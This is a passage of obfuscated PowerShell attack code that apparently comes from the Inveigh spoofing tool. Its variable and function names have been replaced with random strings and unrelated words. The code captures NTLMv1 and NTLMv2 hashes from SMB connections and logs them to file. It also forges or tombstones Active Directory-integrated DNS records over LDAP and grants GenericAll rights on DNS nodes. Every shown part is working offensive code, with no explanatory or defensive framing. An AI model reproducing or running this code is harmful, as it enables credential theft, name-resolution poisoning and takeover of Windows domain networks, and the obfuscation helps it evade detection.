                            if($wzCNZfgp99.IP_capture_list -notcontains $ysNJdeDt99 -and -not $rJDtIBah99.EndsWith('$') -and !$wzCNZfgp99.spoofer_repeat -and $ysNJdeDt99 -ne $IP)
                            {
                                $wzCNZfgp99.IP_capture_list.Add($ysNJdeDt99) > $null
                            }
                        }
                        else
                        {
                            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLMv2 ignored for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99`:`n[machine account]") > $null    
                        }
                    }
                    else
                    {
                        $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLMv2 ignored for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99`:`n[capture disabled]") > $null    
                    }
                }
                else
                {
                    $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLMv2 challenge missing for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99") > $null    
                }
            }
            elseif($faiIyCXF99 -eq 24)
            {
                if($pyGKsWFU99)
                {
                    $MjuCNRqh99 = $rJDtIBah99 + "::" + $QsNmRzDJ99 + ":" + $OdpyuMTp99 + ":" + $CFPCzYul99 + ":" + $pyGKsWFU99
                    if($EtSpsbJY99 -eq 'Y')
                    {
                        if($wzCNZfgp99.machine_accounts -or (!$wzCNZfgp99.machine_accounts -and -not $rJDtIBah99.EndsWith('$')))
                        {
                            $wzCNZfgp99.NTLMv1_list.Add($MjuCNRqh99) > $null
                            if(!$wzCNZfgp99.console_unique -or ($wzCNZfgp99.console_unique -and $wzCNZfgp99.NTLMv1_username_list -notcontains "$ysNJdeDt99 $QsNmRzDJ99\$rJDtIBah99"))
                            {
                                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99`:") > $null
                                $wzCNZfgp99.output_queue.Add($MjuCNRqh99) > $null
                            }
                            else
                            {
                                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99`:`n[not unique]") > $null
                            }
                            if($wzCNZfgp99.file_output -and (!$wzCNZfgp99.file_unique -or ($wzCNZfgp99.file_unique -and $wzCNZfgp99.NTLMv1_username_list -notcontains "$ysNJdeDt99 $QsNmRzDJ99\$rJDtIBah99")))
                            {
                                $wzCNZfgp99.NTLMv1_file_queue.Add($MjuCNRqh99) > $null
                                $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv1 written to " + "Inveigh-NTLMv1.txt") > $null
                            }
                            if($wzCNZfgp99.NTLMv1_username_list -notcontains "$ysNJdeDt99 $QsNmRzDJ99\$rJDtIBah99")
                            {
                                $wzCNZfgp99.NTLMv1_username_list.Add("$ysNJdeDt99 $QsNmRzDJ99\$rJDtIBah99") > $null
                            }
                            if($wzCNZfgp99.IP_capture_list -notcontains $ysNJdeDt99 -and -not $rJDtIBah99.EndsWith('$') -and !$wzCNZfgp99.spoofer_repeat -and $ysNJdeDt99 -ne $IP)
                            {
                                $wzCNZfgp99.IP_capture_list.Add($ysNJdeDt99) > $null
                            }
                        }
                        else
                        {
                            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLMv1 ignored for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99`:`n[machine account]") > $null    
                        }
                    }
                    else
                    {
                        $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLMv1 ignored for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99`:`n[capture disabled]") > $null    
                    }
                }
                else
                {
                    $wzCNZfgp99.output_queue.Add("[-] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLMv1 challenge missing for $QsNmRzDJ99\$rJDtIBah99 from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99") > $null    
                }
            }
            elseif($faiIyCXF99 -eq 0)
            {
                $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] $qOyIAfVB99($Port) NTLM null response from $ysNJdeDt99($XOzfIVQP99)`:$dAOLFIPT99") > $null
            }
            sewerage $QsNmRzDJ99 $rJDtIBah99 $XOzfIVQP99 $vngeYplM99
        }
    }
}
$MBSCqXvi99 =
{
    function umpire
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$gJEKQvQm99,
            [parameter(Mandatory=$false)][String]$WSnjjaRO99,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$iZRypARs99 = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$agAaKWoK99
        )
        $MPIpbeHu99 = resides -WSnjjaRO99 $WSnjjaRO99 -Zone $Zone
        $SbJpqDWB99 = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$iZRypARs99"
        $LxViLJPF99 = $gJEKQvQm99.Split(".")
        foreach($DC in $LxViLJPF99)
        {
            $SbJpqDWB99 += ",DC=$DC"
        }
        if($agAaKWoK99)
        {
            $COahfHxF99 = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$WSnjjaRO99/$SbJpqDWB99",$agAaKWoK99.UserName,$agAaKWoK99.GetNetworkCredential().Password)
        }
        else
        {
            $COahfHxF99 = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$WSnjjaRO99/$SbJpqDWB99"
        }
        $CoaJGbFq99 = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date "1/1/1601").Ticks)
        $CoaJGbFq99 = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($CoaJGbFq99))
        $CoaJGbFq99 = $CoaJGbFq99.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}
        [Byte[]]$vLwGYkrJ99 = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
            $MPIpbeHu99[0..3] +
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
            $CoaJGbFq99
        try
        {
            $COahfHxF99.InvokeSet('dnsRecord',$vLwGYkrJ99)
            $COahfHxF99.InvokeSet('dnsTombstoned',$true)
            $COahfHxF99.SetInfo()
            $wzCNZfgp99.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node $Node tombstoned in $Zone") > $null
        }
        catch
        {
            $kRjlpgSh99 = $_.Exception.Message
            $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
        }
        if($COahfHxF99.Path)
        {
            $COahfHxF99.Close()
        }
    }
    function berated
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$Data,    
            [parameter(Mandatory=$false)][String]$qkeBfqut99,
            [parameter(Mandatory=$false)][String]$gJEKQvQm99,
            [parameter(Mandatory=$false)][String]$WSnjjaRO99,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$iZRypARs99 = "DomainDNSZones",
            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$Type = "A",
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Byte[]]$qTXAuQbl99,
            [parameter(Mandatory=$false)][Int]$PytwhXfh99,
            [parameter(Mandatory=$false)][Int]$TTyaKrRU99,
            [parameter(Mandatory=$false)][Int]$PEpgCFtQ99,
            [parameter(Mandatory=$false)][Int]$Port,
            [parameter(Mandatory=$false)][Int]$TTL = 600,
            [parameter(Mandatory=$false)][Int32]$EFpQSace99,
            [parameter(Mandatory=$false)][Switch]$DUHyGjyn99,
            [parameter(Mandatory=$false)][Switch]$IoGxBAGg99,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$agAaKWoK99
        )
        $SbJpqDWB99 = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$iZRypARs99"
        $LxViLJPF99 = $gJEKQvQm99.Split(".")
        foreach($DC in $LxViLJPF99)
        {
            $SbJpqDWB99 += ",DC=$DC"
        }
        [Byte[]]$qTXAuQbl99 = garaged -Data $Data -WSnjjaRO99 $WSnjjaRO99 -Type $Type -TTL $TTL -Zone $Zone
        if($agAaKWoK99)
        {
            $COahfHxF99 = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$WSnjjaRO99/$SbJpqDWB99",$agAaKWoK99.UserName,$agAaKWoK99.GetNetworkCredential().Password)
        }
        else
        {
            $COahfHxF99 = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$WSnjjaRO99/$SbJpqDWB99"
        }
        try
        {
            $COahfHxF99.InvokeSet('dnsRecord',$qTXAuQbl99)
            $COahfHxF99.SetInfo()
            $hPuUrLtV99 = $true
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $Node added to $Zone") > $null;
            $wzCNZfgp99.ADIDNS_table.$Node = "1"
        }
        catch
        {
            $hPuUrLtV99 = $false
            $kRjlpgSh99 = $_.Exception.Message
            $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
            $wzCNZfgp99.ADIDNS_table.$Node = "0"
        }
        if($COahfHxF99.Path)
        {
            $COahfHxF99.Close()
        }
        return $hPuUrLtV99
    }
    function loudmouthed
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$qkeBfqut99,
            [parameter(Mandatory=$false)][String]$gJEKQvQm99,
            [parameter(Mandatory=$false)][String]$WSnjjaRO99,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$iZRypARs99 = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$agAaKWoK99
        )
        $SbJpqDWB99 = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$iZRypARs99"
        $LxViLJPF99 = $gJEKQvQm99.Split(".")
        foreach($DC in $LxViLJPF99)
        {
            $SbJpqDWB99 += ",DC=$DC"
        }
        if($agAaKWoK99)
        {
            $COahfHxF99 = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$WSnjjaRO99/$SbJpqDWB99",$agAaKWoK99.UserName,$agAaKWoK99.GetNetworkCredential().Password)
        }
        else
        {
            $COahfHxF99 = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$WSnjjaRO99/$SbJpqDWB99"
        }
        try
        {
            $UvFsWrlB99 = $COahfHxF99.InvokeGet('dnsTombstoned')
            $qTXAuQbl99 = $COahfHxF99.InvokeGet('dnsRecord')
        }
        catch
        {
            if($_.Exception.Message -notlike '*Exception calling "InvokeGet" with "1" argument(s): "The specified directory service attribute or value does not exist.*' -and
            $_.Exception.Message -notlike '*The following exception occurred while retrieving member "InvokeGet": "The specified directory service attribute or value does not exist.*')
            {
                $kRjlpgSh99 = $_.Exception.Message
                $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
                $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
            }
        }
        if($COahfHxF99.Path)
        {
            $COahfHxF99.Close()
        }
        $xbhIIkCL99 = $false
        if($UvFsWrlB99 -and $qTXAuQbl99)
        {
            if($qTXAuQbl99[0].GetType().name -eq [Byte])
            {
                if($qTXAuQbl99.Count -ge 32 -and $qTXAuQbl99[2] -eq 0)
                {
                    $xbhIIkCL99 = $true
                }
            }
        }
        return $xbhIIkCL99
    }
    function ellipsis
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][ValidateSet("AccessSystemSecurity","CreateChild","Delete","DeleteChild",
            "DeleteTree","ExtendedRight","GenericAll","GenericExecute","GenericRead","GenericWrite","ListChildren",
            "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]$fjRqMdHs99 = "GenericAll",
            [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$Type = "Allow",    
            [parameter(Mandatory=$false)][String]$qkeBfqut99,
            [parameter(Mandatory=$false)][String]$gJEKQvQm99,
            [parameter(Mandatory=$false)][String]$WSnjjaRO99,
            [parameter(Mandatory=$false)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$iZRypARs99 = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$TwlCoISC99,
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$agAaKWoK99,
            [parameter(ValueFromRemainingArguments=$true)]$ovkaYEik99
        )
        if($iZRypARs99 -eq 'System')
        {
            $SbJpqDWB99 = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$iZRypARs99"
        }
        else
        {
            $SbJpqDWB99 = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$iZRypARs99"
        }
        $LxViLJPF99 = $gJEKQvQm99.Split(".")
        ForEach($DC in $LxViLJPF99)
        {
            $SbJpqDWB99 += ",DC=$DC"
        }
        if($agAaKWoK99)
        {
            $COahfHxF99 = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$WSnjjaRO99/$SbJpqDWB99",$agAaKWoK99.UserName,$agAaKWoK99.GetNetworkCredential().Password)
        }
        else
        {
            $COahfHxF99 = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$WSnjjaRO99/$SbJpqDWB99"
        }
        try
        {
            $CnCaFAth99 = New-Object System.Security.Principal.NTAccount($TwlCoISC99)
            $coXMTkkt99 = $CnCaFAth99.Translate([System.Security.Principal.SecurityIdentifier])
            $LlCDpNQP99 = [System.Security.Principal.IdentityReference]$coXMTkkt99
            $lOFVJVIF99 = [System.DirectoryServices.ActiveDirectoryRights]$fjRqMdHs99
            $UbmNOEKP99 = [System.Security.AccessControl.AccessControlType]$Type
            $XOVsiedr99 = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"
            $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($LlCDpNQP99,$lOFVJVIF99,$UbmNOEKP99,$XOVsiedr99)
        }
        catch
        {
            $kRjlpgSh99 = $_.Exception.Message
            $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
        }
        try
        {
            $COahfHxF99.psbase.ObjectSecurity.AddAccessRule($ACE)
            $COahfHxF99.psbase.CommitChanges()
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] Full Control ACE added for $TwlCoISC99 to $Node DACL") > $null
        }
        catch
        {
            $kRjlpgSh99 = $_.Exception.Message
            $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
        }
        if($COahfHxF99.Path)
        {
            $COahfHxF99.Close()
        }
        return $UPPtHWGb99
    }
    
    function creatively
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$Data,    
            [parameter(Mandatory=$false)][String]$qkeBfqut99,
            [parameter(Mandatory=$false)][String]$gJEKQvQm99,
            [parameter(Mandatory=$false)][String]$WSnjjaRO99,
            [parameter(Mandatory=$false)][String]$MCxnfbXk99,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$iZRypARs99 = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$Type,
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Int]$TTL,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$agAaKWoK99
        )
        $null = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")
        $SbJpqDWB99 = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$iZRypARs99"
        $LxViLJPF99 = $gJEKQvQm99.Split(".")
        foreach($DC in $LxViLJPF99)
        {
            $SbJpqDWB99 += ",DC=$DC"
        }
        [Byte[]]$qTXAuQbl99 = garaged -Data $Data -WSnjjaRO99 $WSnjjaRO99 -Type $Type -TTL $TTL -Zone $Zone
        $bPbtMZgt99 = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($WSnjjaRO99,389)
        if($agAaKWoK99)
        {
            $mEzNZoyG99 = New-Object System.DirectoryServices.Protocols.LdapConnection($bPbtMZgt99,$agAaKWoK99.GetNetworkCredential())
        }
        else
        {
            $mEzNZoyG99 = New-Object System.DirectoryServices.Protocols.LdapConnection($bPbtMZgt99)
        }
        $WEhKXCWh99 = "CN=Dns-Node,CN=Schema,CN=Configuration"
        $ngkQLQjp99 = $MCxnfbXk99.Split(".")
        foreach($DC in $ngkQLQjp99)
        {
            $WEhKXCWh99 += ",DC=$DC"
        }
        
        try
        {
            $mEzNZoyG99.SessionOptions.Sealing = $true
            $mEzNZoyG99.SessionOptions.Signing = $true
            $mEzNZoyG99.Bind()
            $JOzGoKyf99 = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
            $JOzGoKyf99.DistinguishedName = $SbJpqDWB99
            $JOzGoKyf99.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass",@("top","dnsNode"))) > $null
            $JOzGoKyf99.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectCategory",$WEhKXCWh99)) > $null
            $JOzGoKyf99.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dnsRecord",$qTXAuQbl99)) > $null
            $JOzGoKyf99.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dNSTombstoned","TRUE")) > $null
            $mEzNZoyG99.SendRequest($JOzGoKyf99) > $null
            $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $Node type $Type added to $Zone") > $null
            $UPPtHWGb99 = $true
            $wzCNZfgp99.ADIDNS_table.$Node = "1"
        }
        catch
        {
            $kRjlpgSh99 = $_.Exception.Message
            $kRjlpgSh99 = $kRjlpgSh99 -replace "`n",""
            $UPPtHWGb99 = $false
            if($_.Exception.Message -ne 'Exception calling "SendRequest" with "1" argument(s): "The object exists."')
            {
                $wzCNZfgp99.ADIDNS = $null
                $wzCNZfgp99.output_queue.Add("[!] [$(Get-Date -format s)] $kRjlpgSh99 $($_.InvocationInfo.Line.Trim())") > $null
                $wzCNZfgp99.ADIDNS_table.$Node = "0"
            }
        }
        return $UPPtHWGb99
    }
    function resides
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$WSnjjaRO99,
            [parameter(Mandatory=$false)][String]$Zone
        )
        $Zone = $Zone.ToLower()
        function Convert-DataToUInt16($Field)
        {
            [Array]::Reverse($Field)
            return [System.BitConverter]::ToUInt16($Field,0)
        }
        function madrasahs($ffsvscGE99)
        {
            foreach($field in $ffsvscGE99.Values)
            {
                $fZzJPyoJ99 += $field
            }
            return $fZzJPyoJ99
        }
        function inoculated
        {
            param([Int]$IsUQwhEP99,[Int]$fkkZmGkZ99=1,[Int]$iRDzftBy99=255)
            [String]$zfhzdzXA99 = [String](1..$IsUQwhEP99 | ForEach-Object {"{0:X2}" -f (Get-Random -fkkZmGkZ99 $fkkZmGkZ99 -iRDzftBy99 $iRDzftBy99)})
            [Byte[]]$zfhzdzXA99 = $zfhzdzXA99.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            return $zfhzdzXA99
        }
        function temperaments
        {
            param([String]$Name)
            $MiMhawqZ99 = $Name.ToCharArray()
            [Array]$CJiemYjE99 = 0..($MiMhawqZ99.Count - 1) | Where-Object {$MiMhawqZ99[$_] -eq '.'}
            if($CJiemYjE99.Count -gt 0)
            {
                $FmDMPXZT99 = 0
                foreach($index in $CJiemYjE99)
                {
                    $DjEiLRqu99 = $index - $FmDMPXZT99
                    [Byte[]]$BVIqXkiz99 += $DjEiLRqu99
                    [Byte[]]$BVIqXkiz99 += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($FmDMPXZT99,$DjEiLRqu99))
                    $FmDMPXZT99 = $index + 1
                }
                [Byte[]]$BVIqXkiz99 += ($Name.Length - $FmDMPXZT99)
                [Byte[]]$BVIqXkiz99 += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($FmDMPXZT99))
            }
            else
            {
                [Byte[]]$BVIqXkiz99 = $Name.Length
                [Byte[]]$BVIqXkiz99 += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($FmDMPXZT99))
            }
            return $BVIqXkiz99
        }
        function unmask
        {
            param([String]$Name)
            [Byte[]]$type = 0x00,0x06
            [Byte[]]$name = (temperaments $Name) + 0x00
            [Byte[]]$IsUQwhEP99 = [System.BitConverter]::GetBytes($Name.Count + 16)[1,0]
            [Byte[]]$yXZHDFsL99 = inoculated 2
            $WnqxzhFx99 = New-Object System.Collections.Specialized.OrderedDictionary
            $WnqxzhFx99.Add("Length",$IsUQwhEP99)
            $WnqxzhFx99.Add("TransactionID",$yXZHDFsL99)
            $WnqxzhFx99.Add("Flags",[Byte[]](0x01,0x00))
            $WnqxzhFx99.Add("Questions",[Byte[]](0x00,0x01))
            $WnqxzhFx99.Add("AnswerRRs",[Byte[]](0x00,0x00))
            $WnqxzhFx99.Add("AuthorityRRs",[Byte[]](0x00,0x00))
            $WnqxzhFx99.Add("AdditionalRRs",[Byte[]](0x00,0x00))
            $WnqxzhFx99.Add("Queries_Name",$name)
            $WnqxzhFx99.Add("Queries_Type",$type)
            $WnqxzhFx99.Add("Queries_Class",[Byte[]](0x00,0x01))
            return $WnqxzhFx99
        }
        $PDTpKXHh99 = New-Object System.Net.Sockets.TCPClient
        $PDTpKXHh99.Client.ReceiveTimeout = 3000
        try
        {
            $PDTpKXHh99.Connect($WSnjjaRO99,"53")
            $SeeGpHeO99 = $PDTpKXHh99.GetStream()
            $qPVRqDli99 = New-Object System.Byte[] 2048
            $MgVPbSoq99 = unmask $Zone
            [Byte[]]$MvTaHlCo99 = madrasahs $MgVPbSoq99
            $SeeGpHeO99.Write($MvTaHlCo99,0,$MvTaHlCo99.Length) > $null
            $SeeGpHeO99.Flush()   
            $SeeGpHeO99.Read($qPVRqDli99,0,$qPVRqDli99.Length) > $null
            $PDTpKXHh99.Close()
            $SeeGpHeO99.Close()
            if($qPVRqDli99[9] -eq 0)
            {
                $wzCNZfgp99.output_queue.Add("[-] $Zone SOA record not found") > $null
            }
            else
            {
                $yIgZNssd99 = [System.BitConverter]::ToString($qPVRqDli99)
                $yIgZNssd99 = $yIgZNssd99 -replace "-",""
                $PcZyKWtz99 = $yIgZNssd99.IndexOf("C00C00060001")
                $PcZyKWtz99 = $PcZyKWtz99 / 2
                $egKCDxCR99 = $qPVRqDli99[($PcZyKWtz99 + 10)..($PcZyKWtz99 + 11)]
                $egKCDxCR99 = Convert-DataToUInt16 $egKCDxCR99
                [Byte[]]$QMpghGkn99 = $qPVRqDli99[($PcZyKWtz99 + $egKCDxCR99 - 8)..($PcZyKWtz99 + $egKCDxCR99 - 5)]
                $TwnYEEvs99 = [System.BitConverter]::ToUInt32($QMpghGkn99[3..0],0) + 1
                [Byte[]]$weZrRJEX99 = [System.BitConverter]::GetBytes($TwnYEEvs99)[0..3]
            }
        }
        catch
        {
            $wzCNZfgp99.output_queue.Add("[-] $WSnjjaRO99 did not respond on TCP port 53") > $null
        }
        return [Byte[]]$weZrRJEX99
    }
    function garaged
    {
        [CmdletBinding()]
        [OutputType([Byte[]])]
        param
        (
            [parameter(Mandatory=$false)][String]$Data,
            [parameter(Mandatory=$false)][String]$WSnjjaRO99,
            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$Type = "A",
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Int]$PytwhXfh99,
            [parameter(Mandatory=$false)][Int]$TTyaKrRU99,
            [parameter(Mandatory=$false)][Int]$PEpgCFtQ99,
            [parameter(Mandatory=$false)][Int]$Port,
            [parameter(Mandatory=$false)][Int]$TTL = 600,
            [parameter(Mandatory=$false)][Int32]$EFpQSace99,
            [parameter(Mandatory=$false)][Switch]$DUHyGjyn99,
            [parameter(ValueFromRemainingArguments=$true)]$ovkaYEik99
        )
        $MPIpbeHu99 = resides -WSnjjaRO99 $WSnjjaRO99 -Zone $Zone
        function temperaments
        {
            param([String]$Name)
            $MiMhawqZ99 = $Name.ToCharArray()
            [Array]$CJiemYjE99 = 0..($MiMhawqZ99.Count - 1) | Where-Object {$MiMhawqZ99[$_] -eq '.'}
            if($CJiemYjE99.Count -gt 0)
            {
                $FmDMPXZT99 = 0
                foreach($index in $CJiemYjE99)
                {
                    $DjEiLRqu99 = $index - $FmDMPXZT99
                    [Byte[]]$BVIqXkiz99 += $DjEiLRqu99
                    [Byte[]]$BVIqXkiz99 += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($FmDMPXZT99,$DjEiLRqu99))
                    $FmDMPXZT99 = $index + 1
                }
                [Byte[]]$BVIqXkiz99 += ($Name.Length - $FmDMPXZT99)
                [Byte[]]$BVIqXkiz99 += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($FmDMPXZT99))
            }
            else
            {
                [Byte[]]$BVIqXkiz99 = $Name.Length
                [Byte[]]$BVIqXkiz99 += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($FmDMPXZT99))
            }
            return $BVIqXkiz99
        }
        switch ($Type)
        {
            'A'
            {
                [Byte[]]$EwqahtNM99 = 0x01,0x00
                [Byte[]]$KkbNtUVv99 = ([System.BitConverter]::GetBytes(($Data.Split(".")).Count))[0..1]
                [Byte[]]$PCsVUoAt99 += ([System.Net.IPAddress][String]([System.Net.IPAddress]$Data)).GetAddressBytes()
            }
            'AAAA'
            {
                [Byte[]]$EwqahtNM99 = 0x1c,0x00
                [Byte[]]$KkbNtUVv99 = ([System.BitConverter]::GetBytes(($Data -replace ":","").Length / 2))[0..1]
                [Byte[]]$PCsVUoAt99 += ([System.Net.IPAddress][String]([System.Net.IPAddress]$Data)).GetAddressBytes()
            }
            
            'CNAME'
            {
                [Byte[]]$EwqahtNM99 = 0x05,0x00
                [Byte[]]$KkbNtUVv99 = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]
                [Byte[]]$PCsVUoAt99 = $Data.Length + 2
                $PCsVUoAt99 += ($Data.Split(".")).Count
                $PCsVUoAt99 += temperaments $Data
                $PCsVUoAt99 += 0x00
            }
            'DNAME'
            {
                [Byte[]]$EwqahtNM99 = 0x27,0x00
                [Byte[]]$KkbNtUVv99 = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]
                [Byte[]]$PCsVUoAt99 = $Data.Length + 2
                $PCsVUoAt99 += ($Data.Split(".")).Count
                $PCsVUoAt99 += temperaments $Data
                $PCsVUoAt99 += 0x00
            }
            
            'MX'
            {
                [Byte[]]$EwqahtNM99 = 0x0f,0x00
                [Byte[]]$KkbNtUVv99 = ([System.BitConverter]::GetBytes($Data.Length + 6))[0..1]
                [Byte[]]$PCsVUoAt99 = [System.Bitconverter]::GetBytes($PytwhXfh99)[1,0]
                $PCsVUoAt99 += $Data.Length + 2
                $PCsVUoAt99 += ($Data.Split(".")).Count
                $PCsVUoAt99 += temperaments $Data
                $PCsVUoAt99 += 0x00
            }
            'NS'
            {
                [Byte[]]$EwqahtNM99 = 0x02,0x00
                [Byte[]]$KkbNtUVv99 = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]
                [Byte[]]$PCsVUoAt99 = $Data.Length + 2
                $PCsVUoAt99 += ($Data.Split(".")).Count
                $PCsVUoAt99 += temperaments $Data
                $PCsVUoAt99 += 0x00
            }
            'PTR'
            {
                [Byte[]]$EwqahtNM99 = 0x0c,0x00
                [Byte[]]$KkbNtUVv99 = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]
                [Byte[]]$PCsVUoAt99 = $Data.Length + 2
                $PCsVUoAt99 += ($Data.Split(".")).Count
                $PCsVUoAt99 += temperaments $Data
                $PCsVUoAt99 += 0x00
            }
            'SRV'
            {
                [Byte[]]$EwqahtNM99 = 0x21,0x00
                [Byte[]]$KkbNtUVv99 = ([System.BitConverter]::GetBytes($Data.Length + 10))[0..1]
                [Byte[]]$PCsVUoAt99 = [System.Bitconverter]::GetBytes($TTyaKrRU99)[1,0]
                $PCsVUoAt99 += [System.Bitconverter]::GetBytes($PEpgCFtQ99)[1,0]
                $PCsVUoAt99 += [System.Bitconverter]::GetBytes($Port)[1,0]
                $PCsVUoAt99 += $Data.Length + 2
                $PCsVUoAt99 += ($Data.Split(".")).Count
                $PCsVUoAt99 += temperaments $Data
                $PCsVUoAt99 += 0x00
            }
            'TXT'
